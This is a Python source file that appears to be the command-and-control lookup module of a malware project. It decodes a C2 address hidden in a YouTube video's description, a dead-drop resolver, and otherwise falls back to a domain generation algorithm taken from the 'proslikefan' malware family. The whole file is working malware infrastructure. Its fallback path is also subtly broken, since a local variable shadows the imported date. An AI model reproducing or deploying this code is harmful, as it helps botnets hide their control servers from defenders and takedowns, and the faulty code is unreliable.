from ctypes import c_int
from datetime import date, timedelta
import requests
from bs4 import BeautifulSoup
from base64 import b64decode


def get_cnc_from_youtube():
    # personal_test_link = https://youtu.be/8gqOVKsUnP
    response = requests.get("https://www.youtube.com/watch?v=c52OQfjfmts")
    yt_page = BeautifulSoup(response.content, "html.parser")
    b64_encoded_url = yt_page.find("meta",{"name":"description"})
    if b64_encoded_url:
        return [b64decode(b64_encoded_url["content"]).decode()]

# https://github.com/baderj/domain_generation_algorithms/tree/master/proslikefan
def dga(date, magic, offset=1, tlds = ["me"]):
    for tld in tlds:
        seed_string = '.'.join([str(s) for s in [magic, date.month, date.day, date.year, tld]])
        r = abs(hash_string(seed_string)) + offset
        domain = ""
        k = 0
        while(k < r % 7 + 6):
            r = abs(hash_string(domain + str(r))) 
            domain += chr(r % 26 + ord('a')) 
            k += 1
        return f'{domain}.{tld}'
            

def hash_string(s):
    h = c_int(0) 
    for c in s:
        h.value = (h.value << 5) - h.value + ord(c)
    return h.value


def generate_domains():
    domain = get_cnc_from_youtube()
    if not domain:
        date = date.today()
        magic = "Wubba Lubba Dub Dub"
        domain = [dga(date, magic, offset) for offset in range(100)]
    domain.append("localhost:5000")
    return domain